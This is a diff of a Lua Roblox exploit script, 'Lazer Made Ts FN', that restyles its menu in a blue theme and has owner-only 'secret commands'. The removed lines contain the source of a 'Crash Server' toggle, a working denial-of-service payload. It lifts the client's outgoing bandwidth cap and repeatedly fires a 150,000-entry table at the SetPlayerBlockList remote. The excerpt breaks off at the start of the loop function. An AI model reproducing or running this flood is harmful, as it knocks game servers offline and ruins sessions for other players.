@@ -1,17 +1,12 @@
---// Lazer Made Ts FN 🕶️
---// Full GUI (Recoded)
---// Owner: krampus_159
---// Co Owner: ZvajCPuukT
---// Script Users: 🟢
---// Secret Commands: Owner + Co Owner ONLY
---// Script Users Can See Each Other's 🟢 Tags
---// Original Game Nametags Are NEVER Removed
+--// Lazer Made Ts FN 🕶️ - Refined Edition (BLUE)
+--// Owner: krampus_159 | Co Owner: ZvajCPuukT
+--// Name color source: copied VERBATIM from original file
+--// /2v6 typewriter caption on owner tags (blue) - lowered offset
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
 
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
@@ -19,113 +14,115 @@ local PlayerGui = Player:WaitForChild("PlayerGui")
 --//======================================================
 --// CONSTANTS
 --//======================================================
+local OWNER_USERNAME     = "krampus_159"
+local CO_OWNER_USERNAME  = "ZvajCPuukT"
 
-local OWNER_USERNAME = "krampus_159"
-local CO_OWNER_USERNAME = "ZvajCPuukT"
-
-local REMOTE_NAME = "307D0912-4609-4190-B07C-739143B666D3"
-local REGISTER_REMOTE_NAME = "LazerRegisteredPlayers"
-local COMMAND_REMOTE_NAME = "LazerSecretCommands"
-local COFFEE_REMOTE_NAME = "DF310533-4D08-4C3B-94E1-BC67358D919D"
+local REMOTE_NAME               = "307D0912-4609-4190-B07C-739143B666D3"
+local REGISTER_REMOTE_NAME      = "LazerRegisteredPlayers"
+local COMMAND_REMOTE_NAME       = "LazerSecretCommands"
+local COFFEE_REMOTE_NAME        = "DF310533-4D08-4C3B-94E1-BC67358D919D"
 local FAST_LVL_HIDER_REMOTE_NAME = "8E966FA0-E6B9-4566-ADBA-DB9BC15D5C49"
 
-local OWNER_TAG = "LazerOwnerTag"
+local OWNER_TAG    = "LazerOwnerTag"
 local CO_OWNER_TAG = "LazerCoOwnerTag"
-local USER_TAG = "LazerScriptUserTag"
-local CUSTOM_TAG = "LazerPermanentCustomTag"
+local USER_TAG     = "LazerScriptUserTag"
+local CUSTOM_TAG   = "LazerPermanentCustomTag"
 
 local REQUEST_LIMIT = 9210000000000030030300003030303030309999900000303030
-local DELAY = 0
+local DELAY         = 0
+local DISCORD_LINK  = "https://discord.gg/8gYCY6WeRU"
 
-local DISCORD_LINK = "https://discord.gg/8gYCY6WeRU"
-
-local IsOwner = Player.Name == OWNER_USERNAME
-local IsCoOwner = Player.Name == CO_OWNER_USERNAME
+local IsOwner      = Player.Name == OWNER_USERNAME
+local IsCoOwner    = Player.Name == CO_OWNER_USERNAME
 local CanUseSecret = IsOwner or IsCoOwner
 
 --//======================================================
 --// STATE
 --//======================================================
-
 local RegisteredPlayers = {}
 local CustomTags = {}
 
-local NameColorEnabled = false
-local FontChangerEnabled = false
-local CoffeeClicked = false
+local NameColorEnabled    = false
+local FontChangerEnabled  = false
+local CoffeeClicked       = false
 local FastLvlHiderEnabled = false
 local InvisibleNameClicks = 0
 local RequestCount = 0
 local ColorIndex = 1
-local FontIndex = 1
+local FontIndex  = 1
 
-local Event
-local RegisterRemote
-local CommandRemote
-local FastLvlHiderEvent
+local Event, RegisterRemote, CommandRemote, FastLvlHiderEvent
 
 --//======================================================
---// REMOVE OLD GUI
+--// CLEANUP
 --//======================================================
-
-local OldGui = PlayerGui:FindFirstChild("LazerMadeTsFN")
-if OldGui then
-	OldGui:Destroy()
-end
-
-local OldCrashGui = PlayerGui:FindFirstChild("CrashServerUI")
-if OldCrashGui then
-	OldCrashGui:Destroy()
+for _, name in ipairs({"LazerMadeTsFN", "CrashServerUI"}) do
+    local old = PlayerGui:FindFirstChild(name)
+    if old then old:Destroy() end
 end
 
 --//======================================================
---// COLORS
+--// === NAME COLOR SOURCE (VERBATIM FROM ORIGINAL) ===
 --//======================================================
-
-local Colors = {
-	[1] = Color3.new(0.3333333432674408, 0, 0),
-	[2] = Color3.new(0, 0, 0),
-	[3] = Color3.new(0, 0.3333333432674408, 0),
-	[4] = Color3.new(0.3333333432674408, 1, 1),
-	[5] = Color3.new(0.6627451181411743, 0.6666666865348816, 0.501960813999176),
-	[6] = Color3.new(0, 0, 0.49803921580314636),
-	[7] = Color3.new(0, 1, 0.003921568859368563),
-	[8] = Color3.new(1, 0.3333333432674408, 0),
-	[9] = Color3.new(0, 0, 0.49803921580314636),
-	[10] = Color3.new(0, 1, 0.003921568859368563),
-	[11] = Color3.new(1, 0.3333333432674408, 0),
-	[12] = Color3.new(1, 1, 1),
-	[13] = Color3.new(1, 0, 0.9960784316062927),
-	[14] = Color3.new(0, 0.3333333432674408, 0.9960784316062927),
-	[15] = Color3.new(0.9960784316062927, 0, 0)
+local NameColorSource = {
+    [1] = Color3.new(0.3333333432674408, 0, 0),
+    [2] = Color3.new(0, 0, 0),
+    [3] = Color3.new(0, 0.3333333432674408, 0),
+    [4] = Color3.new(0.3333333432674408, 1, 1),
+    [5] = Color3.new(0.6627451181411743, 0.6666666865348816, 0.501960813999176),
+    [6] = Color3.new(0, 0, 0.49803921580314636),
+    [7] = Color3.new(0, 1, 0.003921568859368563),
+    [8] = Color3.new(1, 0.3333333432674408, 0),
+    [9] = Color3.new(0, 0, 0.49803921580314636),
+    [10] = Color3.new(0, 1, 0.003921568859368563),
+    [11] = Color3.new(1, 0.3333333432674408, 0),
+    [12] = Color3.new(1, 1, 1),
+    [13] = Color3.new(1, 0, 0.9960784316062927),
+    [14] = Color3.new(0, 0.3333333432674408, 0.9960784316062927),
+    [15] = Color3.new(0.9960784316062927, 0, 0),
 }
 
 --//======================================================
 --// FONTS
 --//======================================================
-
 local Fonts = {
-	Enum.Font.Jura,
-	Enum.Font.LuckiestGuy,
-	Enum.Font.IndieFlower,
-	Enum.Font.Creepster,
-	Enum.Font.Antique,
-	Enum.Font.Cartoon,
-	Enum.Font.Gotham,
-	Enum.Font.Nunito,
-	Enum.Font.Roboto,
-	Enum.Font.SourceSans,
-	Enum.Font.SourceSansBold,
-	Enum.Font.Arcade,
-	Enum.Font.Arial,
-	Enum.Font.Code,
-	Enum.Font.Highway
+    Enum.Font.Jura, Enum.Font.LuckiestGuy, Enum.Font.IndieFlower,
+    Enum.Font.Creepster, Enum.Font.Antique, Enum.Font.Cartoon,
+    Enum.Font.Gotham, Enum.Font.Nunito, Enum.Font.Roboto,
+    Enum.Font.SourceSans, Enum.Font.SourceSansBold, Enum.Font.Arcade,
+    Enum.Font.Arial, Enum.Font.Code, Enum.Font.Highway,
 }
 
 --//======================================================
---// SCREEN GUI (MAIN)
+--// PALETTE (BLUE THEME)
 --//======================================================
+local Colors = {
+    Bg        = Color3.fromRGB(10, 14, 26),
+    Surface   = Color3.fromRGB(20, 28, 46),
+    SurfaceHi = Color3.fromRGB(30, 40, 64),
+    SurfaceOn = Color3.fromRGB(30, 60, 120),
+    Border    = Color3.fromRGB(45, 65, 100),
+    Text      = Color3.fromRGB(230, 240, 255),
+    TextDim   = Color3.fromRGB(130, 150, 185),
+    Accent    = Color3.fromRGB(70, 150, 255),
+    Gold      = Color3.fromRGB(100, 200, 255),
+    Success   = Color3.fromRGB(80, 220, 220),
+}
 
+--//======================================================
+--// TWEEN HELPERS
+--//======================================================
+local EaseOut     = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local EaseOutFast = TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local EaseInOut   = TweenInfo.new(0.30, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+
+local function Tween(obj, props, info)
+    TweenService:Create(obj, info or EaseOut, props):Play()
+end
+
+--//======================================================
+--// SCREEN GUI
+--//======================================================
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "LazerMadeTsFN"
 ScreenGui.ResetOnSpawn = false
@@ -134,1057 +131,1061 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = PlayerGui
 
 --//======================================================
+--// NOTIFICATIONS
+--//======================================================
+local NotifContainer = Instance.new("Frame")
+NotifContainer.Name = "NotifContainer"
+NotifContainer.AnchorPoint = Vector2.new(1, 0)
+NotifContainer.Position = UDim2.new(1, -20, 0, 20)
+NotifContainer.Size = UDim2.new(0, 270, 0, 500)
+NotifContainer.BackgroundTransparency = 1
+NotifContainer.Parent = ScreenGui
+
+local NotifLayout = Instance.new("UIListLayout")
+NotifLayout.Padding = UDim.new(0, 8)
+NotifLayout.SortOrder = Enum.SortOrder.LayoutOrder
+NotifLayout.Parent = NotifContainer
+
+local ActiveNotifs = {}
+local NotifCounter = 0
+
+local function Notify(text, side)
+    for i = #ActiveNotifs, 1, -1 do
+        local n = ActiveNotifs[i]
+        if not n.Parent then
+            table.remove(ActiveNotifs, i)
+        elseif n:GetAttribute("Text") == text then
+            n:Destroy()
+            table.remove(ActiveNotifs, i)
+        end
+    end
+
+    NotifCounter = NotifCounter + 1
+    local notif = Instance.new("Frame")
+    notif.Size = UDim2.new(1, 0, 0, 46)
+    notif.BackgroundColor3 = Colors.Surface
+    notif.BackgroundTransparency = 1
+    notif.BorderSizePixel = 0
+    notif.LayoutOrder = -NotifCounter
+    notif:SetAttribute("Text", text)
+    notif.Parent = NotifContainer
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = notif
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Colors.Border
+    stroke.Transparency = 1
+    stroke.Parent = notif
+
+    local accentColor = (side == "Right") and Colors.Success or Colors.Accent
+
+    local accent = Instance.new("Frame")
+    accent.Size = UDim2.new(0, 3, 0, 22)
+    accent.Position = UDim2.new(0, 0, 0.5, -11)
+    accent.BackgroundColor3 = accentColor
+    accent.BorderSizePixel = 0
+    accent.Parent = notif
+    local aCorner = Instance.new("UICorner")
+    aCorner.CornerRadius = UDim.new(0, 2)
+    aCorner.Parent = accent
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -24, 1, 0)
+    label.Position = UDim2.new(0, 16, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Colors.Text
+    label.TextSize = 12
+    label.Font = Enum.Font.GothamMedium
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextWrapped = true
+    label.TextTransparency = 1
+    label.Parent = notif
+
+    table.insert(ActiveNotifs, notif)
+
+    Tween(notif, {BackgroundTransparency = 0.05}, EaseOutFast)
+    Tween(stroke, {Transparency = 0.4}, EaseOutFast)
+    Tween(label, {TextTransparency = 0}, EaseOutFast)
+
+    task.delay(5, function()
+        if not notif.Parent then return end
+        Tween(notif, {BackgroundTransparency = 1})
+        Tween(stroke, {Transparency = 1})
+        local fade = TweenService:Create(label, EaseOut, {TextTransparency = 1})
+        fade:Play()
+        fade.Completed:Wait()
+        notif:Destroy()
+        for i = #ActiveNotifs, 1, -1 do
+            if ActiveNotifs[i] == notif then table.remove(ActiveNotifs, i) end
+        end
+    end)
+end
+
+--//======================================================
+--// GLOBAL ALERT
+--//======================================================
+local function ShowGlobalAlert(message)
+    local existing = ScreenGui:FindFirstChild("LazerGlobalAlert")
+    if existing then existing:Destroy() end
+
+    local frame = Instance.new("Frame")
+    frame.Name = "LazerGlobalAlert"
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frame.Size = UDim2.new(0, 560, 0, 120)
+    frame.BackgroundColor3 = Color3.fromRGB(12, 18, 34)
+    frame.BackgroundTransparency = 1
+    frame.BorderSizePixel = 0
+    frame.ZIndex = 1000
+    frame.Parent = ScreenGui
+
+    local constraint = Instance.new("UISizeConstraint")
+    constraint.MaxSize = Vector2.new(650, 120)
+    constraint.MinSize = Vector2.new(280, 100)
+    constraint.Parent = frame
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 16)
+    corner.Parent = frame
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Colors.Accent
+    stroke.Thickness = 2
+    stroke.Transparency = 1
+    stroke.Parent = frame
+
+    local header = Instance.new("TextLabel")
+    header.Size = UDim2.new(1, -20, 0, 28)
+    header.Position = UDim2.new(0, 14, 0, 10)
+    header.BackgroundTransparency = 1
+    header.Text = "📢 GLOBAL ALERT"
+    header.TextColor3 = Colors.Gold
+    header.TextSize = 16
+    header.Font = Enum.Font.GothamBold
+    header.TextXAlignment = Enum.TextXAlignment.Left
+    header.TextTransparency = 1
+    header.ZIndex = 1001
+    header.Parent = frame
+
+    local msg = Instance.new("TextLabel")
+    msg.Size = UDim2.new(1, -28, 1, -45)
+    msg.Position = UDim2.new(0, 14, 0, 42)
+    msg.BackgroundTransparency = 1
+    msg.Text = tostring(message)
+    msg.TextColor3 = Colors.Text
+    msg.TextSize = 18
+    msg.Font = Enum.Font.GothamMedium
+    msg.TextWrapped = true
+    msg.TextXAlignment = Enum.TextXAlignment.Left
+    msg.TextYAlignment = Enum.TextYAlignment.Top
+    msg.TextTransparency = 1
+    msg.ZIndex = 1001
+    msg.Parent = frame
+
+    Tween(frame, {BackgroundTransparency = 0.05}, EaseInOut)
+    Tween(stroke, {Transparency = 0}, EaseInOut)
+    Tween(header, {TextTransparency = 0}, EaseInOut)
+    Tween(msg, {TextTransparency = 0}, EaseInOut)
+
+    task.delay(6, function()
+        if not frame.Parent then return end
+        local fadeOut = TweenInfo.new(0.7, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
+        Tween(frame, {BackgroundTransparency = 1}, fadeOut)
+        Tween(stroke, {Transparency = 1}, fadeOut)
+        Tween(header, {TextTransparency = 1}, fadeOut)
+        local fadeMsg = TweenService:Create(msg, fadeOut, {TextTransparency = 1})
+        fadeMsg:Play()
+        fadeMsg.Completed:Wait()
+        frame:Destroy()
+    end)
+end
+
+--//======================================================
 --// MAIN FRAME
 --//======================================================
+local MAIN_W = 300
+local MAIN_H = CanUseSecret and 426 or 368
 
 local Main = Instance.new("Frame")
 Main.Name = "Main"
-Main.Size = UDim2.new(0, 280, 0, CanUseSecret and 426 or 346)
-Main.Position = UDim2.new(0.5, -140, 0.5, CanUseSecret and -213 or -173)
-Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
+Main.Position = UDim2.new(0.5, -MAIN_W / 2, 0.5, -MAIN_H / 2)
+Main.BackgroundColor3 = Colors.Bg
 Main.BackgroundTransparency = 0.05
 Main.BorderSizePixel = 0
 Main.Parent = ScreenGui
 
 local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 14)
+MainCorner.CornerRadius = UDim.new(0, 16)
 MainCorner.Parent = Main
 
 local MainStroke = Instance.new("UIStroke")
-MainStroke.Color = Color3.fromRGB(255, 255, 255)
-MainStroke.Thickness = 1.5
-MainStroke.Transparency = 0.2
+MainStroke.Color = Colors.Border
+MainStroke.Thickness = 1
+MainStroke.Transparency = 0.3
 MainStroke.Parent = Main
 
-local Gradient = Instance.new("UIGradient")
-Gradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
-	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
-})
-Gradient.Rotation = 25
-Gradient.Offset = Vector2.new(-1, 0)
-Gradient.Parent = Main
-
-task.spawn(function()
-	while Main.Parent do
-		local A = TweenService:Create(Gradient, TweenInfo.new(3, Enum.EasingStyle.Linear), { Offset = Vector2.new(1, 0) })
-		A:Play()
-		A.Completed:Wait()
-
-		if not Main.Parent then break end
-
-		local B = TweenService:Create(Gradient, TweenInfo.new(3, Enum.EasingStyle.Linear), { Offset = Vector2.new(-1, 0) })
-		B:Play()
-		B.Completed:Wait()
-	end
-end)
-
---//======================================================
---// TITLE
---//======================================================
+local AccentBar = Instance.new("Frame")
+AccentBar.Size = UDim2.new(1, -40, 0, 2)
+AccentBar.Position = UDim2.new(0, 20, 0, 0)
+AccentBar.BackgroundColor3 = Colors.Accent
+AccentBar.BackgroundTransparency = 0.2
+AccentBar.BorderSizePixel = 0
+AccentBar.Parent = Main
+local AccentBarCorner = Instance.new("UICorner")
+AccentBarCorner.CornerRadius = UDim.new(0, 2)
+AccentBarCorner.Parent = AccentBar
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -45, 0, 28)
-Title.Position = UDim2.new(0, 12, 0, 7)
+Title.Size = UDim2.new(1, -90, 0, 24)
+Title.Position = UDim2.new(0, 16, 0, 12)
 Title.BackgroundTransparency = 1
 Title.Text = "Lazer Made Ts FN 🕶️"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 16
+Title.TextColor3 = Colors.Text
+Title.TextSize = 15
 Title.Font = Enum.Font.GothamBold
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Main
 
-local Subtitle = Instance.new("TextLabel")
-Subtitle.Size = UDim2.new(1, -24, 0, 18)
-Subtitle.Position = UDim2.new(0, 12, 0, 34)
-Subtitle.BackgroundTransparency = 1
-if CanUseSecret then
-	Subtitle.Text = "OWNER PANEL"
-	Subtitle.TextColor3 = Color3.fromRGB(255, 255, 0)
-else
-	Subtitle.Text = "SCRIPT USER"
-	Subtitle.TextColor3 = Color3.fromRGB(0, 255, 100)
-end
-Subtitle.TextSize = 10
-Subtitle.Font = Enum.Font.GothamBold
-Subtitle.TextXAlignment = Enum.TextXAlignment.Left
-Subtitle.Parent = Main
+local Badge = Instance.new("Frame")
+Badge.Position = UDim2.new(0, 16, 0, 38)
+Badge.BackgroundColor3 = CanUseSecret and Colors.Gold or Colors.Success
+Badge.BackgroundTransparency = 0.85
+Badge.BorderSizePixel = 0
+Badge.AutomaticSize = Enum.AutomaticSize.X
+Badge.Size = UDim2.new(0, 0, 0, 16)
+Badge.Parent = Main
+local BadgeCorner = Instance.new("UICorner")
+BadgeCorner.CornerRadius = UDim.new(0, 8)
+BadgeCorner.Parent = Badge
+local BadgeLabel = Instance.new("TextLabel")
+BadgeLabel.BackgroundTransparency = 1
+BadgeLabel.Size = UDim2.new(0, 0, 1, 0)
+BadgeLabel.Text = CanUseSecret and "OWNER PANEL" or "SCRIPT USER"
+BadgeLabel.TextColor3 = CanUseSecret and Colors.Gold or Colors.Success
+BadgeLabel.TextSize = 9
+BadgeLabel.Font = Enum.Font.GothamBold
+BadgeLabel.AutomaticSize = Enum.AutomaticSize.X
+BadgeLabel.Parent = Badge
+local BadgePadding = Instance.new("UIPadding")
+BadgePadding.PaddingLeft = UDim.new(0, 8)
+BadgePadding.PaddingRight = UDim.new(0, 8)
+BadgePadding.Parent = Badge
 
---//======================================================
---// BUTTON CREATOR
---//======================================================
-
-local function MakeButton(Text, Y, Height)
-	local Button = Instance.new("TextButton")
-	Button.Size = UDim2.new(1, -24, 0, Height or 34)
-	Button.Position = UDim2.new(0, 12, 0, Y)
-	Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	Button.BackgroundTransparency = 0.1
-	Button.BorderSizePixel = 0
-	Button.Text = Text
-	Button.TextColor3 = Color3.fromRGB(255, 255, 255)
-	Button.TextSize = 12
-	Button.Font = Enum.Font.GothamBold
-	Button.Parent = Main
-
-	local Corner = Instance.new("UICorner")
-	Corner.CornerRadius = UDim.new(0, 9)
-	Corner.Parent = Button
-
-	return Button
-end
-
---//======================================================
---// NOTIFICATIONS
---//======================================================
-
-local ActiveNotifications = {}
-
-local function Notify(Text, Side)
-	for i = #ActiveNotifications, 1, -1 do
-		local Old = ActiveNotifications[i]
-		if not Old or not Old.Parent then
-			table.remove(ActiveNotifications, i)
-		elseif Old.Text == Text then
-			Old:Destroy()
-			table.remove(ActiveNotifications, i)
-		end
-	end
-
-	local N = Instance.new("TextLabel")
-	N.Size = UDim2.new(0, 245, 0, 34)
-	if Side == "Right" then
-		N.AnchorPoint = Vector2.new(1, 0)
-		N.Position = UDim2.new(1, -12, 0, 20)
-	else
-		N.Position = UDim2.new(0, 12, 0, 20)
-	end
-	N.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	N.BackgroundTransparency = 1
-	N.BorderSizePixel = 0
-	N.Text = Text
-	N.TextColor3 = Color3.fromRGB(255, 255, 255)
-	N.TextSize = 11
-	N.Font = Enum.Font.GothamBold
-	N.TextTransparency = 1
-	N.ZIndex = 500
-	N.Parent = ScreenGui
-
-	local C = Instance.new("UICorner")
-	C.CornerRadius = UDim.new(0, 9)
-	C.Parent = N
-
-	table.insert(ActiveNotifications, N)
-
-	TweenService:Create(N, TweenInfo.new(0.15), {
-		TextTransparency = 0,
-		BackgroundTransparency = 0.08
-	}):Play()
-
-	task.delay(6, function()
-		if not N.Parent then return end
-
-		local Fade = TweenService:Create(N, TweenInfo.new(0.4), {
-			TextTransparency = 1,
-			BackgroundTransparency = 1
-		})
-		Fade:Play()
-		Fade.Completed:Wait()
-		N:Destroy()
-
-		for i = #ActiveNotifications, 1, -1 do
-			if ActiveNotifications[i] == N then
-				table.remove(ActiveNotifications, i)
-			end
-		end
-	end)
-end
-
---//======================================================
---// BIG GLOBAL ALERT
---//======================================================
-
-local function ShowGlobalAlert(Message)
-	local Existing = ScreenGui:FindFirstChild("LazerGlobalAlert")
-	if Existing then Existing:Destroy() end
-
-	local AlertFrame = Instance.new("Frame")
-	AlertFrame.Name = "LazerGlobalAlert"
-	AlertFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-	AlertFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-	AlertFrame.Size = UDim2.new(0.85, 0, 0, 125)
-	AlertFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
-	AlertFrame.BackgroundTransparency = 1
-	AlertFrame.BorderSizePixel = 0
-	AlertFrame.ZIndex = 1000
-	AlertFrame.Parent = ScreenGui
-
-	local SizeConstraint = Instance.new("UISizeConstraint")
-	SizeConstraint.MaxSize = Vector2.new(650, 125)
-	SizeConstraint.MinSize = Vector2.new(280, 100)
-	SizeConstraint.Parent = AlertFrame
-
-	local Corner = Instance.new("UICorner")
-	Corner.CornerRadius = UDim.new(0, 16)
-	Corner.Parent = AlertFrame
-
-	local Stroke = Instance.new("UIStroke")
-	Stroke.Color = Color3.fromRGB(255, 255, 255)
-	Stroke.Thickness = 2
-	Stroke.Transparency = 1
-	Stroke.Parent = AlertFrame
-
-	local Header = Instance.new("TextLabel")
-	Header.Size = UDim2.new(1, -20, 0, 30)
-	Header.Position = UDim2.new(0, 10, 0, 8)
-	Header.BackgroundTransparency = 1
-	Header.Text = "📢 GLOBAL ALERT"
-	Header.TextColor3 = Color3.fromRGB(255, 255, 0)
-	Header.TextSize = 17
-	Header.Font = Enum.Font.GothamBold
-	Header.TextTransparency = 1
-	Header.ZIndex = 1001
-	Header.Parent = AlertFrame
-
-	local MessageLabel = Instance.new("TextLabel")
-	MessageLabel.Size = UDim2.new(1, -25, 1, -45)
-	MessageLabel.Position = UDim2.new(0, 12, 0, 40)
-	MessageLabel.BackgroundTransparency = 1
-	MessageLabel.Text = tostring(Message)
-	MessageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-	MessageLabel.TextSize = 20
-	MessageLabel.Font = Enum.Font.GothamBold
-	MessageLabel.TextWrapped = true
-	MessageLabel.TextTransparency = 1
-	MessageLabel.ZIndex = 1001
-	MessageLabel.Parent = AlertFrame
-
-	TweenService:Create(AlertFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
-		BackgroundTransparency = 0.08
-	}):Play()
-	TweenService:Create(Stroke, TweenInfo.new(0.2), { Transparency = 0.05 }):Play()
-	TweenService:Create(Header, TweenInfo.new(0.2), { TextTransparency = 0 }):Play()
-	TweenService:Create(MessageLabel, TweenInfo.new(0.2), { TextTransparency = 0 }):Play()
-
-	task.delay(6, function()
-		if not AlertFrame.Parent then return end
-
-		local FadeInfo = TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
-		TweenService:Create(AlertFrame, FadeInfo, { BackgroundTransparency = 1 }):Play()
-		TweenService:Create(Stroke, FadeInfo, { Transparency = 1 }):Play()
-		TweenService:Create(Header, FadeInfo, { TextTransparency = 1 }):Play()
-
-		local FadeMessage = TweenService:Create(MessageLabel, FadeInfo, { TextTransparency = 1 })
-		FadeMessage:Play()
-		FadeMessage.Completed:Wait()
-		AlertFrame:Destroy()
-	end)
-end
-
---//======================================================
---// BASIC BUTTONS
---//======================================================
-
-local NameColorButton   = MakeButton("NAME COLOR: OFF", 55)
-local FastLvlHiderButton = MakeButton("FAST LVL HIDER: OFF", 93)
-
---// Crash Server button (toggle on/off, source embedded below)
-local CrashServerButton = MakeButton("Crash Server ❗❗: OFF", 131)
-
-local Status = Instance.new("TextLabel")
-Status.Size = UDim2.new(1, -24, 0, 18)
-Status.Position = UDim2.new(0, 12, 0, 169)
-Status.BackgroundTransparency = 1
-Status.Text = "Requests: 0"
-Status.TextColor3 = Color3.fromRGB(220, 220, 220)
-Status.TextSize = 10
-Status.Font = Enum.Font.Gotham
-Status.TextXAlignment = Enum.TextXAlignment.Left
-Status.Parent = Main
-
-local FontButton          = MakeButton("FONT CHANGER: OFF", 196)
-local InvisibleNameButton = MakeButton("INVISIBLE NAME: 0/6", 234)
-local CoffeeButton        = MakeButton("☕ GET COFFEE", 272)
-local DiscordButton       = MakeButton("☁ JOIN DISCORD", 310, 28)
-
---//======================================================
---// CRASH SERVER SOURCE (embedded inside the button)
---//======================================================
-
-local CrashSource = [==[
-local RunService = game:GetService("RunService")
-
-local Children       = 150000
-local NestedPerChild = 0
-local FieldsPerChild = 0
-local FireBurst      = 1
-local FrameDelay     = 0.125
-local FieldSize      = 0
-local RebuildEach    = false
-
-local state = {
-    running = false,
-    thread  = nil,
-    remote  = nil,
-    cache   = nil,
-    pad     = "",
-}
-
-local function resolve()
-    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
-    if not rrs then return nil end
-    local r = rrs:FindFirstChild("SetPlayerBlockList")
-    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
-        return r
-    end
-    return nil
-end
-
-state.remote = resolve()
-
-pcall(function()
-    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -38, 0, 10)
+CloseBtn.BackgroundColor3 = Colors.Surface
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Text = "×"
+CloseBtn.TextColor3 = Colors.TextDim
+CloseBtn.TextSize = 18
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.AutoButtonColor = false
+CloseBtn.Parent = Main
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 8)
+CloseCorner.Parent = CloseBtn
+CloseBtn.MouseEnter:Connect(function()
+    Tween(CloseBtn, {BackgroundColor3 = Colors.SurfaceHi, TextColor3 = Colors.Text}, EaseOutFast)
+end)
+CloseBtn.MouseLeave:Connect(function()
+    Tween(CloseBtn, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.TextDim}, EaseOutFast)
 end)
 
-state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+--//======================================================
+--// FACTORIES
+--//======================================================
+local ButtonHeight  = 32
+local ButtonGap     = 5
+local SectionHeight = 16
 
-local function build()
-    local root = table.create(Children)
-    for i = 1, Children do
-        local entry = { id = i, v = i * 2 }
-        for k = 1, FieldsPerChild do
-            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
-        end
-        for j = 1, NestedPerChild do
-            entry["n" .. j] = { a = i, b = j }
-        end
-        root[i] = entry
-    end
-    return root
+local function MakeSectionLabel(text, y)
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -32, 0, SectionHeight)
+    label.Position = UDim2.new(0, 16, 0, y)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Colors.TextDim
+    label.TextSize = 10
+    label.Font = Enum.Font.GothamBold
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = Main
+    return label
 end
 
-local function fire()
-    if not state.remote then
-        state.remote = resolve()
-        if not state.remote then return end
-    end
-    local payload
-    if RebuildEach or not state.cache then
-        payload = build()
-        if not RebuildEach then state.cache = payload end
-    else
-        payload = state.cache
-    end
-    for _ = 1, FireBurst do
-        state.remote:FireServer(payload)
-    end
+local function MakeButton(text, y, height)
+    height = height or ButtonHeight
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -32, 0, height)
+    btn.Position = UDim2.new(0, 16, 0, y)
+    btn.BackgroundColor3 = Colors.Surface
+    btn.BorderSizePixel = 0
+    btn.Text = text
+    btn.TextColor3 = Colors.Text
+    btn.TextSize = 12
+    btn.Font = Enum.Font.GothamMedium
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    btn.AutoButtonColor = false
+    btn.Parent = Main
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 9)
+    corner.Parent = btn
+
+    local pad = Instance.new("UIPadding")
+    pad.PaddingLeft = UDim.new(0, 12)
+    pad.Parent = btn
+
+    btn.MouseEnter:Connect(function()
+        if btn:GetAttribute("On") then return end
+        Tween(btn, {BackgroundColor3 = Colors.SurfaceHi}, EaseOutFast)
+    end)
+    btn.MouseLeave:Connect(function()
+        if btn:GetAttribute("On") then return end
+        Tween(btn, {BackgroundColor3 = Colors.Surface}, EaseOutFast)
+    end)
+
+    return btn
 end
 
-local function start()
